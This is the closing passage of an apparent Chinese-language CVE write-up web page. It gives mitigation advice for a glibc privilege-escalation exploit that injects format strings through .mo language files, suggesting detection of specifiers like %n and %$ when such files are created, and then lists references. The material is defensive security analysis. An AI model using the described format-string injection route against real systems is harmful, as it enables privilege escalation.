<p>由于漏洞利用通过语言支持文件实现格式化字符串注入，因此监控系统的语言支持文件能够起到一定作用。例如，监控进程读取和创建的.mo文件是否有异常的格式化字符串(比如包含%n, %$的格式化字符串)，可以只在创建的时候检测减少性能损失：</p>
</li>
</ul>
<p><code>shell
  root@debian:/usr/share/locale/gl/LC_MESSAGES/# file util-linux.mo
  util-linux.mo: GNU message catalog (little endian), revision 0.0, 214 messages</code></p>
<h3 id="6">6.参考</h3>
<p><a href="https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/">LibcRealpathBufferUnderflow</a>
https://www.freebuf.com/column/162202.html
https://bbs.pediy.com/thread-228678.htm</p>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../cve-2019-12735-01/" class="btn btn-neutral float-right" title="Cve 2019 12735 01">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cve-2018-1000001-01/" class="btn btn-neutral" title="Cve 2018 1000001 01"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>
    
  </div>

  <div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../cve-2018-1000001-01/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../cve-2019-12735-01/" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>
    <script src="../js/theme.js"></script>

</body>
</html>
